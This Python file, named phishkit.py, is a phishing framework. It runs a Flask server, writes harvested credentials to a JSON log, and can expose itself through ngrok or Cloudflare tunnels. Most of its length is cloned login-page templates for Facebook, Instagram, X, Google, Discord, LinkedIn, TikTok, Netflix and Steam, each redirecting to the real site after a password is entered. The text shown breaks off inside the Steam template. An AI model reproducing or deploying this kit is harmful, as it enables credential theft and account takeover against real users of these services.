#!/usr/bin/env python3
# phishkit.py — multi-platform phishing framework (pixel-perfect + auto tunnels)
# usage:
#   python3 phishkit.py                  # local only
#   python3 phishkit.py --ngrok          # auto ngrok
#   python3 phishkit.py --cloudflare     # auto cloudflare tunnel
#   python3 phishkit.py --ngrok --cf     # both (ngrok preferred)

from flask import Flask, request, render_template_string, redirect, make_response
from datetime import datetime
import os
import sys
import json
import threading
import subprocess
import time
import signal
import atexit
import argparse
import shutil
import requests

app = Flask(__name__)
app.secret_key = os.urandom(24)

# ── config ──────────────────────────────────────────────────────────────
HOST = "0.0.0.0"
PORT = 8080
LOG_DIR = "logs"
CRED_FILE = os.path.join(LOG_DIR, "credentials.json")
os.makedirs(LOG_DIR, exist_ok=True)

# ── pixel-perfect platform templates ────────────────────────────────────
# These are rebuilt with real layout, spacing, typography, and colors
# matching current (2025-2026) official login pages as closely as possible.

PLATFORMS = {
    "facebook": {
        "display": "Facebook",
        "redirect": "https://www.facebook.com/",
        "html": r'''
<!DOCTYPE html>
<html lang="en" id="facebook">
<head>
<meta charset="utf-8">
<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, user-scalable=no">
<title>Facebook – log in or sign up</title>
<style>
html,body{margin:0;padding:0;height:100%;background:#f0f2f5;font-family:Helvetica,Arial,sans-serif;color:#1c1e21}
#root{display:flex;flex-direction:column;min-height:100%}
.header{background:#fff;border-bottom:1px solid #dddfe2;padding:0 16px;height:56px;display:flex;align-items:center}
.logo{color:#1877f2;font-size:2rem;font-weight:bold;letter-spacing:-1px}
.main{flex:1;display:flex;align-items:center;justify-content:center;padding:20px}
.card{background:#fff;border-radius:8px;box-shadow:0 2px 4px rgba(0,0,0,.1),0 8px 16px rgba(0,0,0,.1);padding:20px;width:396px;max-width:100%;box-sizing:border-box}
.card h2{font-size:18px;line-height:22px;font-weight:normal;margin:0 0 20px;text-align:center;color:#1c1e21}
input[type=text],input[type=password],input[type=email]{
  width:100%;padding:14px 16px;margin:6px 0;border:1px solid #dddfe2;border-radius:6px;
  font-size:17px;box-sizing:border-box;outline:none;background:#fff
}
input:focus{border-color:#1877f2;box-shadow:0 0 0 2px #e7f3ff}
button[type=submit]{
  width:100%;background:#1877f2;color:#fff;border:none;border-radius:6px;
  font-size:20px;font-weight:bold;padding:12px;margin-top:10px;cursor:pointer
}
button[type=submit]:hover{background:#166fe5}
.forgot{display:block;text-align:center;margin:16px 0 0;color:#1877f2;font-size:14px;text-decoration:none}
.divider{border-bottom:1px solid #dadde1;margin:20px 0;position:relative}
.divider span{position:absolute;left:50%;transform:translateX(-50%);background:#fff;padding:0 10px;color:#1c1e21;font-size:13px;top:-9px}
.create{display:block;width:fit-content;margin:0 auto;background:#42b72a;color:#fff;border:none;border-radius:6px;font-size:17px;font-weight:bold;padding:12px 16px;text-decoration:none;cursor:pointer}
.error{background:#ffebe9;border:1px solid #f5c2c7;color:#a94442;padding:12px;border-radius:6px;margin-bottom:12px;font-size:14px;text-align:center}
.footer{background:#fff;border-top:1px solid #dddfe2;padding:20px;text-align:center;font-size:12px;color:#8a8d91}
.footer a{color:#8a8d91;margin:0 8px;text-decoration:none}
</style>
</head>
<body>
<div id="root">
  <div class="header"><div class="logo">facebook</div></div>
  <div class="main">
    <div class="card">
      <h2>Log in to Facebook</h2>
      {% if error %}<div class="error">{{ error }}</div>{% endif %}
      <form method="POST" action="">
        <input type="text" name="email" placeholder="Email address or phone number" required autocomplete="username">
        <input type="password" name="password" placeholder="Password" required autocomplete="current-password">
        <button type="submit">Log In</button>
      </form>
      <a class="forgot" href="#">Forgotten password?</a>
      <div class="divider"><span>or</span></div>
      <a class="create" href="#">Create new account</a>
    </div>
  </div>
  <div class="footer">
    <a href="#">English (US)</a>
    <a href="#">Privacy</a>
    <a href="#">Terms</a>
    <a href="#">Cookies</a>
    <a href="#">Help</a>
  </div>
</div>
</body>
</html>
'''
    },
    "instagram": {
        "display": "Instagram",
        "redirect": "https://www.instagram.com/",
        "html": r'''
<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="utf-8">
<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
<title>Instagram</title>
<style>
html,body{margin:0;padding:0;height:100%;background:#fafafa;font-family:-apple-system,BlinkMacSystemFont,"Segoe UI",Roboto,Helvetica,Arial,sans-serif;color:#262626}
.page{display:flex;flex-direction:column;align-items:center;justify-content:center;min-height:100%;padding:20px}
.card{background:#fff;border:1px solid #dbdbdb;border-radius:1px;padding:40px 40px 20px;width:350px;max-width:100%;box-sizing:border-box;text-align:center}
.logo{font-family:"Billabong","Segoe Script",cursive;font-size:50px;margin:0 0 22px;line-height:1;color:#262626}
input{
  width:100%;padding:9px 0 7px 8px;margin:0 0 6px;border:1px solid #dbdbdb;border-radius:3px;
  background:#fafafa;font-size:12px;box-sizing:border-box;outline:none
}
input:focus{border-color:#a8a8a8}
button{
  width:100%;background:#0095f6;color:#fff;border:none;border-radius:4px;
  font-size:14px;font-weight:600;padding:7px;margin:8px 0 0;cursor:pointer;opacity:1
}
button:hover{background:#1877f2}
.or{display:flex;align-items:center;margin:18px 0 18px;color:#8e8e8e;font-size:13px;font-weight:600}
.or::before,.or::after{content:"";flex:1;height:1px;background:#dbdbdb}
.or span{padding:0 18px}
.fb{display:flex;align-items:center;justify-content:center;color:#385185;font-size:14px;font-weight:600;text-decoration:none;margin-bottom:20px}
.fb svg{margin-right:8px}
.forgot{color:#00376b;font-size:12px;text-decoration:none}
.signup{background:#fff;border:1px solid #dbdbdb;border-radius:1px;padding:20px;width:350px;max-width:100%;box-sizing:border-box;text-align:center;margin-top:10px;font-size:14px}
.signup a{color:#0095f6;font-weight:600;text-decoration:none}
.error{color:#ed4956;font-size:14px;margin:10px 0;line-height:18px}
.app{margin-top:20px;text-align:center;font-size:14px;color:#262626}
.stores{display:flex;justify-content:center;gap:8px;margin-top:16px}
.stores img{height:40px}
</style>
</head>
<body>
<div class="page">
  <div class="card">
    <div class="logo">Instagram</div>
    {% if error %}<div class="error">{{ error }}</div>{% endif %}
    <form method="POST">
      <input type="text" name="email" placeholder="Phone number, username, or email" required autocomplete="username">
      <input type="password" name="password" placeholder="Password" required autocomplete="current-password">
      <button type="submit">Log in</button>
    </form>
    <div class="or"><span>OR</span></div>
    <a class="fb" href="#">
      <svg width="16" height="16" viewBox="0 0 16 16" fill="#385185"><path d="M8 0C3.6 0 0 3.6 0 8c0 4 2.9 7.3 6.8 7.9v-5.6H4.8V8h2V6.2c0-2 1.2-3.1 3-3.1.9 0 1.8.1 1.8.1v2h-1c-1 0-1.3.6-1.3 1.2V8h2.2l-.4 2.3H9.3v5.6C13.1 15.3 16 12 16 8c0-4.4-3.6-8-8-8z"/></svg>
      Log in with Facebook
    </a>
    <a class="forgot" href="#">Forgot password?</a>
  </div>
  <div class="signup">Don't have an account? <a href="#">Sign up</a></div>
  <div class="app">Get the app.</div>
</div>
</body>
</html>
'''
    },
    "twitter": {
        "display": "X",
        "redirect": "https://x.com/",
        "html": r'''
<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="utf-8">
<meta name="viewport" content="width=device-width, initial-scale=1">
<title>X</title>
<style>
html,body{margin:0;padding:0;height:100%;background:#000;font-family:-apple-system,BlinkMacSystemFont,"Segoe UI",Roboto,Helvetica,Arial,sans-serif;color:#e7e9ea}
.page{display:flex;min-height:100%}
.left{flex:1;background:#000;display:flex;align-items:center;justify-content:center}
.left svg{width:min(380px,80%);fill:#fff}
.right{flex:1;display:flex;align-items:center;justify-content:center;padding:20px}
.box{width:100%;max-width:400px}
.logo{margin-bottom:40px}
.logo svg{width:40px;height:40px;fill:#fff}
h1{font-size:31px;font-weight:700;margin:0 0 32px;line-height:36px}
input{
  width:100%;padding:16px 12px;margin:0 0 12px;border:1px solid #333;border-radius:4px;
  background:transparent;color:#e7e9ea;font-size:17px;box-sizing:border-box;outline:none
}
input:focus{border-color:#1d9bf0;box-shadow:0 0 0 1px #1d9bf0}
button{
  width:100%;background:#fff;color:#0f1419;border:none;border-radius:9999px;
  font-size:15px;font-weight:700;padding:14px;margin-top:12px;cursor:pointer
}
button:hover{background:#e6e6e6}
.forgot{display:block;text-align:center;margin-top:24px;color:#1d9bf0;font-size:15px;text-decoration:none}
.error{color:#f4212e;font-size:15px;margin-bottom:12px}
@media(max-width:800px){.left{display:none}.right{flex:none;width:100%}}
</style>
</head>
<body>
<div class="page">
  <div class="left">
    <svg viewBox="0 0 24 24"><path d="M18.244 2.25h3.308l-7.227 8.26 8.502 11.24H16.17l-5.214-6.817L4.99 21.75H1.68l7.73-8.835L1.254 2.25H8.08l4.713 6.231zm-1.161 17.52h1.833L7.084 4.126H5.117z"/></svg>
  </div>
  <div class="right">
    <div class="box">
      <div class="logo">
        <svg viewBox="0 0 24 24"><path d="M18.244 2.25h3.308l-7.227 8.26 8.502 11.24H16.17l-5.214-6.817L4.99 21.75H1.68l7.73-8.835L1.254 2.25H8.08l4.713 6.231zm-1.161 17.52h1.833L7.084 4.126H5.117z"/></svg>
      </div>
      <h1>Sign in to X</h1>
      {% if error %}<div class="error">{{ error }}</div>{% endif %}
      <form method="POST">
        <input type="text" name="email" placeholder="Phone, email, or username" required autocomplete="username">
        <input type="password" name="password" placeholder="Password" required autocomplete="current-password">
        <button type="submit">Next</button>
      </form>
      <a class="forgot" href="#">Forgot password?</a>
    </div>
  </div>
</div>
</body>
</html>
'''
    },
    "gmail": {
        "display": "Google",
        "redirect": "https://mail.google.com/",
        "html": r'''
<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="utf-8">
<meta name="viewport" content="width=device-width, initial-scale=1">
<title>Sign in - Google Accounts</title>
<style>
html,body{margin:0;padding:0;height:100%;background:#fff;font-family:"Google Sans",Roboto,Arial,sans-serif;color:#202124}
.page{display:flex;align-items:center;justify-content:center;min-height:100%;padding:20px}
.card{width:100%;max-width:450px;border:1px solid #dadce0;border-radius:8px;padding:48px 40px 36px;box-sizing:border-box}
.logo{text-align:center;margin-bottom:16px}
.logo svg{height:24px}
h1{font-size:24px;font-weight:400;text-align:center;margin:0 0 8px;line-height:1.333}
.sub{text-align:center;font-size:16px;color:#202124;margin:0 0 32px}
input{
  width:100%;padding:13px 15px;margin:0 0 16px;border:1px solid #dadce0;border-radius:4px;
  font-size:16px;box-sizing:border-box;outline:none;background:#fff
}
input:focus{border-color:#1a73e8;box-shadow:0 0 0 2px rgba(26,115,232,.2)}
.actions{display:flex;justify-content:space-between;align-items:center;margin-top:32px}
.actions a{color:#1a73e8;font-size:14px;font-weight:500;text-decoration:none}
button{
  background:#1a73e8;color:#fff;border:none;border-radius:4px;
  font-size:14px;font-weight:500;padding:10px 24px;cursor:pointer;min-width:88px
}
button:hover{background:#1765cc;box-shadow:0 1px 2px 0 rgba(66,133,244,.3),0 1px 3px 1px rgba(66,133,244,.15)}
.error{color:#d93025;font-size:14px;margin:0 0 16px;text-align:left}
.footer{margin-top:24px;text-align:center;font-size:12px;color:#5f6368}
.footer a{color:#5f6368;margin:0 8px;text-decoration:none}
</style>
</head>
<body>
<div class="page">
  <div class="card">
    <div class="logo">
      <svg viewBox="0 0 75 24" width="75" height="24" xmlns="http://www.w3.org/2000/svg">
        <path fill="#4285F4" d="M11.5 12.5v-2.5h8.3c.2 1 .3 2 .3 3.1 0 3.5-1.2 6.3-3.3 8.3-2.1 2-5 3.1-8.5 3.1-3.4 0-6.3-1.1-8.4-3.3C-2.3 18.9-3.5 15.9-3.5 12.5s1.2-6.4 3.4-8.6C2.1 1.7 5 0.5 8.4.5c3.1 0 5.6 1.1 7.5 3l-2.1 2.1c-1.3-1.3-3-1.9-5.4-1.9-2.6 0-4.8.9-6.5 2.6-1.7 1.7-2.6 3.9-2.6 6.5s.9 4.8 2.6 6.5c1.7 1.7 3.9 2.6 6.5 2.6 2.2 0 3.9-.6 5.2-1.7 1.1-.9 1.7-2.2 1.9-3.8H11.5z"/>
        <path fill="#EA4335" d="M35.3 12.5c0 1.9-.5 3.4-1.5 4.6-1 1.2-2.3 1.8-3.9 1.8-1.6 0-2.9-.6-3.9-1.8-1-1.2-1.5-2.7-1.5-4.6s.5-3.4 1.5-4.6c1-1.2 2.3-1.8 3.9-1.8 1.6 0 2.9.6 3.9 1.8 1 1.2 1.5 2.7 1.5 4.6zm-2.3 0c0-1.2-.3-2.1-.8-2.8-.6-.7-1.3-1-2.3-1s-1.7.3-2.3 1c-.6.7-.8 1.6-.8 2.8s.3 2.1.8 2.8c.6.7 1.3 1 2.3 1s1.7-.3 2.3-1c.5-.7.8-1.6.8-2.8z"/>
        <path fill="#FBBC05" d="M48.3 12.5c0 1.9-.5 3.4-1.5 4.6-1 1.2-2.3 1.8-3.9 1.8-1.6 0-2.9-.6-3.9-1.8-1-1.2-1.5-2.7-1.5-4.6s.5-3.4 1.5-4.6c1-1.2 2.3-1.8 3.9-1.8 1.6 0 2.9.6 3.9 1.8 1 1.2 1.5 2.7 1.5 4.6zm-2.3 0c0-1.2-.3-2.1-.8-2.8-.6-.7-1.3-1-2.3-1s-1.7.3-2.3 1c-.6.7-.8 1.6-.8 2.8s.3 2.1.8 2.8c.6.7 1.3 1 2.3 1s1.7-.3 2.3-1c.5-.7.8-1.6.8-2.8z"/>
        <path fill="#4285F4" d="M58.5 7.5v9.5c0 2.5-.6 4.4-1.8 5.7-1.2 1.3-2.9 2-5 2-1.9 0-3.5-.5-4.7-1.5l1.3-1.8c.9.7 2 1.1 3.3 1.1 1.3 0 2.3-.4 3-1.1.7-.7 1-1.8 1-3.2v-.8h-.1c-.6.8-1.5 1.2-2.7 1.2-1.4 0-2.6-.6-3.5-1.7-.9-1.1-1.4-2.5-1.4-4.2s.5-3.1 1.4-4.2c.9-1.1 2.1-1.7 3.5-1.7 1.2 0 2.1.4 2.7 1.2h.1V7.5h2.2zm-2.2 4.9c0-1.1-.3-2-.9-2.6-.6-.6-1.3-.9-2.2-.9s-1.6.3-2.2.9c-.6.6-.9 1.5-.9 2.6s.3 2 .9 2.6c.6.6 1.3.9 2.2.9s1.6-.3 2.2-.9c.6-.6.9-1.5.9-2.6z"/>
        <path fill="#34A853" d="M68.5 12.5c0 1.9-.5 3.4-1.5 4.6-1 1.2-2.3 1.8-3.9 1.8-1.6 0-2.9-.6-3.9-1.8-1-1.2-1.5-2.7-1.5-4.6s.5-3.4 1.5-4.6c1-1.2 2.3-1.8 3.9-1.8 1.6 0 2.9.6 3.9 1.8 1 1.2 1.5 2.7 1.5 4.6zm-2.3 0c0-1.2-.3-2.1-.8-2.8-.6-.7-1.3-1-2.3-1s-1.7.3-2.3 1c-.6.7-.8 1.6-.8 2.8s.3 2.1.8 2.8c.6.7 1.3 1 2.3 1s1.7-.3 2.3-1c.5-.7.8-1.6.8-2.8z"/>
        <path fill="#EA4335" d="M78.5 7.5l-4.5 10.5h-2.4l-4.5-10.5h2.5l3.2 7.8 3.2-7.8z"/>
      </svg>
    </div>
    <h1>Sign in</h1>
    <div class="sub">to continue to Gmail</div>
    {% if error %}<div class="error">{{ error }}</div>{% endif %}
    <form method="POST">
      <input type="email" name="email" placeholder="Email or phone" required autocomplete="username">
      <input type="password" name="password" placeholder="Enter your password" required autocomplete="current-password">
      <div class="actions">
        <a href="#">Forgot email?</a>
        <button type="submit">Next</button>
      </div>
    </form>
    <div class="footer">
      <a href="#">Help</a>
      <a href="#">Privacy</a>
      <a href="#">Terms</a>
    </div>
  </div>
</div>
</body>
</html>
'''
    },
    "discord": {
        "display": "Discord",
        "redirect": "https://discord.com/channels/@me",
        "html": r'''
<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="utf-8">
<meta name="viewport" content="width=device-width, initial-scale=1">
<title>Discord</title>
<style>
html,body{margin:0;padding:0;height:100%;background:#313338;font-family:Whitney,"Helvetica Neue",Helvetica,Arial,"Lucida Grande",sans-serif;color:#f2f3f5}
.page{display:flex;align-items:center;justify-content:center;min-height:100%;padding:20px;background:url('data:image/svg+xml;utf8,<svg xmlns="http://www.w3.org/2000/svg" width="100%25" height="100%25"><defs><linearGradient id="g" x1="0" y1="0" x2="1" y2="1"><stop offset="0%25" stop-color="%235865f2"/><stop offset="100%25" stop-color="%23eb459e"/></linearGradient></defs><rect width="100%25" height="100%25" fill="url(%23g)"/></svg>') center/cover}
.card{background:#313338;border-radius:5px;padding:32px;width:100%;max-width:480px;box-shadow:0 2px 10px 0 rgba(0,0,0,.2);box-sizing:border-box}
h1{font-size:24px;font-weight:600;text-align:center;margin:0 0 8px;line-height:30px}
.sub{text-align:center;color:#b5bac1;font-size:16px;margin:0 0 20px;line-height:20px}
label{display:block;font-size:12px;font-weight:700;color:#b5bac1;margin-bottom:8px;text-transform:uppercase;letter-spacing:.02em}
input{
  width:100%;padding:10px;margin:0 0 20px;border:none;border-radius:3px;
  background:#1e1f22;color:#dbdee1;font-size:16px;box-sizing:border-box;outline:none
}
input:focus{outline:2px solid #00a8fc}
button{
  width:100%;background:#5865f2;color:#fff;border:none;border-radius:3px;
  font-size:16px;font-weight:500;padding:12px;cursor:pointer;margin-top:4px
}
button:hover{background:#4752c4}
.forgot{display:inline-block;margin-top:-12px;margin-bottom:20px;color:#00a8fc;font-size:14px;text-decoration:none}
.error{color:#f23f43;font-size:14px;margin:0 0 16px;text-align:center}
.register{margin-top:8px;color:#949ba4;font-size:14px}
.register a{color:#00a8fc;text-decoration:none}
</style>
</head>
<body>
<div class="page">
  <div class="card">
    <h1>Welcome back!</h1>
    <div class="sub">We're so excited to see you again!</div>
    {% if error %}<div class="error">{{ error }}</div>{% endif %}
    <form method="POST">
      <label>Email or Phone Number <span style="color:#f23f43">*</span></label>
      <input type="text" name="email" required autocomplete="username">
      <label>Password <span style="color:#f23f43">*</span></label>
      <input type="password" name="password" required autocomplete="current-password">
      <a class="forgot" href="#">Forgot your password?</a>
      <button type="submit">Log In</button>
    </form>
    <div class="register">Need an account? <a href="#">Register</a></div>
  </div>
</div>
</body>
</html>
'''
    },
    "linkedin": {
        "display": "LinkedIn",
        "redirect": "https://www.linkedin.com/",
        "html": r'''
<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="utf-8">
<meta name="viewport" content="width=device-width, initial-scale=1">
<title>LinkedIn Login, Sign in | LinkedIn</title>
<style>
html,body{margin:0;padding:0;height:100%;background:#f3f2ef;font-family:-apple-system,system-ui,BlinkMacSystemFont,"Segoe UI",Roboto,"Helvetica Neue","Fira Sans",Ubuntu,Oxygen,"Oxygen Sans",Cantarell,"Droid Sans","Apple Color Emoji","Segoe UI Emoji","Segoe UI Symbol","Lucida Grande",Helvetica,Arial,sans-serif;color:#000}
.page{display:flex;flex-direction:column;min-height:100%}
.header{padding:16px 24px}
.header svg{height:34px}
.main{flex:1;display:flex;align-items:center;justify-content:center;padding:20px}
.card{background:#fff;border-radius:8px;box-shadow:0 4px 12px rgba(0,0,0,.15);padding:24px;width:100%;max-width:400px;box-sizing:border-box}
h1{font-size:32px;font-weight:600;margin:0 0 8px;line-height:1.25}
.sub{color:#666;font-size:14px;margin:0 0 24px}
label{display:block;font-size:14px;font-weight:600;margin-bottom:4px;color:#000}
input{
  width:100%;padding:12px;margin:0 0 16px;border:1px solid rgba(0,0,0,.6);border-radius:4px;
  font-size:16px;box-sizing:border-box;outline:none
}
input:focus{border-color:#0a66c2;box-shadow:0 0 0 1px #0a66c2}
button{
  width:100%;background:#0a66c2;color:#fff;border:none;border-radius:24px;
  font-size:16px;font-weight:600;padding:12px 24px;cursor:pointer;margin-top:8px
}
button:hover{background:#004182}
.forgot{display:block;margin:16px 0;color:#0a66c2;font-size:14px;font-weight:600;text-decoration:none}
.error{color:#d11124;font-size:14px;margin:0 0 12px}
.divider{display:flex;align-items:center;margin:16px 0;color:#666;font-size:14px}
.divider::before,.divider::after{content:"";flex:1;height:1px;background:#ccc}
.divider span{padding:0 16px}
.google{display:flex;align-items:center;justify-content:center;width:100%;padding:12px;border:1px solid #000;border-radius:24px;background:#fff;font-size:16px;font-weight:600;cursor:pointer;text-decoration:none;color:#000;box-sizing:border-box}
</style>
</head>
<body>
<div class="page">
  <div class="header">
    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 84 24" fill="#0a66c2"><path d="M12.5 2.5c-5.5 0-10 4.5-10 10s4.5 10 10 10 10-4.5 10-10-4.5-10-10-10zm0 16.5c-3.6 0-6.5-2.9-6.5-6.5s2.9-6.5 6.5-6.5 6.5 2.9 6.5 6.5-2.9 6.5-6.5 6.5zM24.5 8.5h-3v11h3v-11zm-1.5-1.5c1 0 1.8-.8 1.8-1.8S24 3.5 23 3.5s-1.8.8-1.8 1.8.8 1.8 1.8 1.8zM32 8.2c-1.5 0-2.7.6-3.4 1.5V8.5h-3v11h3v-6c0-1.5.8-2.3 2-2.3 1.1 0 1.8.7 1.8 2.1v6.2h3v-6.6c0-2.6-1.6-4.2-3.4-4.2zM45.5 8.5h-2.7l-2.3 3.5-2.3-3.5H35.5l3.7 5.5-3.9 5.5h2.7l2.5-3.7 2.5 3.7h2.7l-3.9-5.5 3.7-5.5zM52 8.2c-3 0-5 2.2-5 5.3s2 5.3 5 5.3c1.5 0 2.8-.5 3.7-1.5l-1.8-1.5c-.5.5-1.2.8-1.9.8-1.3 0-2.2-.8-2.4-2.1h6.4c0-.2.1-.5.1-.8 0-2.9-1.8-5.5-4.1-5.5zm-2.3 4.2c.2-1.2 1.1-2 2.3-2s2 .8 2.2 2h-4.5zM62.5 8.2c-1.5 0-2.7.6-3.4 1.5V3.5h-3v16h3v-6c0-1.5.8-2.3 2-2.3 1.1 0 1.8.7 1.8 2.1v6.2h3v-6.6c0-2.6-1.6-4.2-3.4-4.2zM72.5 8.2c-2.9 0-5 2.2-5 5.3s2.1 5.3 5 5.3 5-2.2 5-5.3-2.1-5.3-5-5.3zm0 7.8c-1.4 0-2.3-1.1-2.3-2.5s.9-2.5 2.3-2.5 2.3 1.1 2.3 2.5-.9 2.5-2.3 2.5zM84 13.5c0-3-1.9-5.3-4.6-5.3-1.5 0-2.7.6-3.4 1.5V8.5h-3v16h3v-2.2c.7.9 1.9 1.5 3.4 1.5 2.7 0 4.6-2.3 4.6-5.3zm-3 0c0 1.4-.9 2.5-2.3 2.5s-2.3-1.1-2.3-2.5.9-2.5 2.3-2.5 2.3 1.1 2.3 2.5z"/></svg>
  </div>
  <div class="main">
    <div class="card">
      <h1>Sign in</h1>
      <div class="sub">Stay updated on your professional world</div>
      {% if error %}<div class="error">{{ error }}</div>{% endif %}
      <form method="POST">
        <label>Email or Phone</label>
        <input type="text" name="email" required autocomplete="username">
        <label>Password</label>
        <input type="password" name="password" required autocomplete="current-password">
        <a class="forgot" href="#">Forgot password?</a>
        <button type="submit">Sign in</button>
      </form>
      <div class="divider"><span>or</span></div>
      <a class="google" href="#">Continue with Google</a>
    </div>
  </div>
</div>
</body>
</html>
'''
    },
    "tiktok": {
        "display": "TikTok",
        "redirect": "https://www.tiktok.com/",
        "html": r'''
<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="utf-8">
<meta name="viewport" content="width=device-width, initial-scale=1">
<title>Log in | TikTok</title>
<style>
html,body{margin:0;padding:0;height:100%;background:#fff;font-family:ProximaNova,Arial,Tahoma,PingFangSC,sans-serif;color:#161823}
.page{display:flex;align-items:center;justify-content:center;min-height:100%;padding:20px}
.card{width:100%;max-width:375px;text-align:center}
h1{font-size:32px;font-weight:700;margin:0 0 16px;line-height:1.2}
.sub{color:#8a8b91;font-size:15px;margin:0 0 32px}
input{
  width:100%;padding:14px 12px;margin:0 0 12px;border:1px solid #e3e3e4;border-radius:4px;
  background:#f1f1f2;font-size:16px;box-sizing:border-box;outline:none
}
input:focus{border-color:#fe2c55;background:#fff}
button{
  width:100%;background:#fe2c55;color:#fff;border:none;border-radius:4px;
  font-size:16px;font-weight:600;padding:14px;cursor:pointer;margin-top:8px
}
button:hover{background:#e01e45}
.error{color:#fe2c55;font-size:14px;margin:0 0 12px}
.forgot{display:block;margin:16px 0;color:#fe2c55;font-size:14px;text-decoration:none}
.signup{margin-top:24px;font-size:15px;color:#161823}
.signup a{color:#fe2c55;font-weight:600;text-decoration:none}
</style>
</head>
<body>
<div class="page">
  <div class="card">
    <h1>Log in to TikTok</h1>
    <div class="sub">Manage your account, check notifications, comment on videos, and more.</div>
    {% if error %}<div class="error">{{ error }}</div>{% endif %}
    <form method="POST">
      <input type="text" name="email" placeholder="Email or username" required autocomplete="username">
      <input type="password" name="password" placeholder="Password" required autocomplete="current-password">
      <button type="submit">Log in</button>
    </form>
    <a class="forgot" href="#">Forgot password?</a>
    <div class="signup">Don't have an account? <a href="#">Sign up</a></div>
  </div>
</div>
</body>
</html>
'''
    },
    "netflix": {
        "display": "Netflix",
        "redirect": "https://www.netflix.com/",
        "html": r'''
<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="utf-8">
<meta name="viewport" content="width=device-width, initial-scale=1">
<title>Netflix</title>
<style>
html,body{margin:0;padding:0;height:100%;background:#000;font-family:Netflix Sans,Helvetica Neue,Segoe UI,Roboto,Ubuntu,sans-serif;color:#fff}
.page{min-height:100%;background:radial-gradient(ellipse at top,#1a1a1a 0%,#000 70%);display:flex;flex-direction:column}
.header{padding:20px 3%;}
.header svg{height:36px;fill:#e50914}
.main{flex:1;display:flex;align-items:center;justify-content:center;padding:20px}
.card{background:rgba(0,0,0,.75);border-radius:4px;padding:60px 68px 40px;width:100%;max-width:450px;box-sizing:border-box}
h1{font-size:32px;font-weight:700;margin:0 0 28px}
input{
  width:100%;padding:16px 20px;margin:0 0 16px;border:none;border-radius:4px;
  background:#333;color:#fff;font-size:16px;box-sizing:border-box;outline:none
}
input:focus{background:#454545}
input::placeholder{color:#8c8c8c}
button{
  width:100%;background:#e50914;color:#fff;border:none;border-radius:4px;
  font-size:16px;font-weight:700;padding:16px;cursor:pointer;margin-top:24px
}
button:hover{background:#f40612}
.error{color:#e87c03;font-size:14px;margin:0 0 12px}
.remember{display:flex;align-items:center;margin-top:12px;font-size:13px;color:#b3b3b3}
.remember input{width:auto;margin:0 8px 0 0}
.signup{margin-top:16px;color:#737373;font-size:16px}
.signup a{color:#fff;text-decoration:none}
.signup a:hover{text-decoration:underline}
</style>
</head>
<body>
<div class="page">
  <div class="header">
    <svg viewBox="0 0 111 30" fill="#e50914"><path d="M105.062 14.28L111 30c-1.75-.25-3.499-.563-5.248-.844l-3.345-8.376-3.437 7.969c-1.687-.281-3.312-.594-5.031-.875l6.031-13.75L94.218 0h5.063l3.062 7.874L105.875 0h5.124l-5.937 14.28zM90.469 0h-5.094v27.25c1.688.187 3.374.406 5.094.656V0zm-10.594 12.5c0 3.688-2.594 6.188-6.5 6.188-2.25 0-3.75-.875-4.688-2.031v6.594c1.563.25 3.156.469 4.75.688V0h4.406v1.875c1-.969 2.75-2.188 5.094-2.188 4.094 0 6.938 3.188 6.938 7.813v5zm-4.5-.188V7.313c0-2.25-1.25-3.875-3.25-3.875-1.5 0-2.75.938-3.25 2.125v8.5c.5 1.125 1.75 2 3.25 2 1.938 0 3.25-1.625 3.25-3.75zm-22.75-6.25h5.031V0h-5.03v6.062zm0 21.938c1.688.25 3.375.469 5.031.688V8.625h-5.03v19.375zM54.938 3.5V0h-14.5v3.5h4.719v23.25c1.562.25 3.156.469 4.75.688V3.5h5.031zM37.75 12.5c0 3.688-2.594 6.188-6.5 6.188-2.25 0-3.75-.875-4.688-2.031v6.594c1.563.25 3.156.469 4.75.688V0h4.406v1.875c1-.969 2.75-2.188 5.094-2.188 4.094 0 6.938 3.188 6.938 7.813v5zm-4.5-.188V7.313c0-2.25-1.25-3.875-3.25-3.875-1.5 0-2.75.938-3.25 2.125v8.5c.5 1.125 1.75 2 3.25 2 1.938 0 3.25-1.625 3.25-3.75zM15.29 28.97L0 29.72V0h5.03v23.75l10.26-.75z"/></svg>
  </div>
  <div class="main">
    <div class="card">
      <h1>Sign In</h1>
      {% if error %}<div class="error">{{ error }}</div>{% endif %}
      <form method="POST">
        <input type="text" name="email" placeholder="Email or phone number" required autocomplete="username">
        <input type="password" name="password" placeholder="Password" required autocomplete="current-password">
        <button type="submit">Sign In</button>
        <div class="remember">
          <input type="checkbox" id="rem" checked>
          <label for="rem">Remember me</label>
        </div>
      </form>
      <div class="signup">New to Netflix? <a href="#">Sign up now</a>.</div>
    </div>
  </div>
</div>
</body>
</html>
'''
    },
    "steam": {
        "display": "Steam",
        "redirect": "https://store.steampowered.com/",
        "html": r'''
<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="utf-8">
<meta name="viewport" content="width=device-width, initial-scale=1">
<title>Sign In</title>
<style>
html,body{margin:0;padding:0;height:100%;background:#1b2838;font-family:"Motiva Sans",Arial,Helvetica,sans-serif;color:#fff}
.page{display:flex;align-items:center;justify-content:center;min-height:100%;padding:20px}
.card{background:#16202d;border-radius:4px;padding:30px;width:100%;max-width:400px;box-sizing:border-box}
h1{font-size:24px;font-weight:300;margin:0 0 20px;color:#fff}
label{display:block;font-size:12px;color:#c6d4df;margin-bottom:4px;text-transform:uppercase;letter-spacing:.03em}
input{
  width:100%;padding:10px;margin:0 0 16px;border:none;border-radius:3px;
  background:#316282;color:#fff;font-size:14px;box-sizing:border-box;outline:none
}
input:focus{background:#3d7a9c}
button{
  width:100%;background:linear-gradient(to bottom,#a4d007 5%,#536904 95%);
  color:#d2ef78;border:none;border-radius:2px;font-size:16px;font-weight:500;padding:12px;cursor:pointer
}
button:hover{background:linear-gradient(to bottom,#b6d908 5%,#6a8a05 95%)}
.error{color:#c15755;font-size:14px;margin:0 0 12px}
.help{margin-top:16px;font-size:12px;color:#c6d4df}
.help a{color:#67c1f5;text-decoration:none}
</style>
</head>
<body>
<div class="page">
  <div class="card">
    <h1>Sign in</h1>
